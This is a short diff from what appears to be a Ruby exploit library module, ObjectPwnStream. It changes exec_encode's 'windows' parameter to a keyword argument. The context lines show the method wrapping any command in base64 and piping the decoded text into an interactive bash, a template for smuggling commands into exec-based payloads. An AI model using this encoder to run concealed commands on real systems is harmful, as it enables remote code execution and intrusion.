@@ -9,7 +9,7 @@ module ObjectPwnStream
       (int>=mid) ? int - max_unsigned : int
     end
 
-    def exec_encode(cmd, windows=false)
+    def exec_encode(cmd, windows: false)
       !windows ?
         "bash -c {echo,#{[cmd].pack('m0')}}|{base64,-d}|{bash,-i}"
         :
